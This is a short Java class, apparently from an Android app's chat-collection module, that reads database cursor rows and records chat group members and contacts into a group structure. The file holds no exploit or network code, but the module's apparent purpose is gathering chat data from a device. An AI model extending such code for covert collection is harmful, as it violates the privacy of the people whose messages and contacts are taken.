package com.android.dvci.db;

import android.database.Cursor;

import com.android.dvci.module.chat.ChatGroups;
import com.android.dvci.module.chat.Contact;

public class RecordGroupsVisitor extends RecordVisitor {

	private final boolean extended ;
	ChatGroups groups;

	public RecordGroupsVisitor(ChatGroups groups, String order, boolean extented) {
		this.groups = groups;
		this.extended = extented;
		this.order = order;
	}

	@Override
	public long cursor(Cursor cursor) {

		if(extended){
			String group = cursor.getString(0);
			String id = cursor.getString(1);
			String name = cursor.getString(2);
			String extra = cursor.getString(3);

			Contact remote = new Contact(id,extra,name,extra);

			groups.addPeerToGroup(group, remote);

		}else {

			String key = cursor.getString(0);
			String value = cursor.getString(1);

			groups.addPeerToGroup(key, value);
		}
		return 0;
	}

}
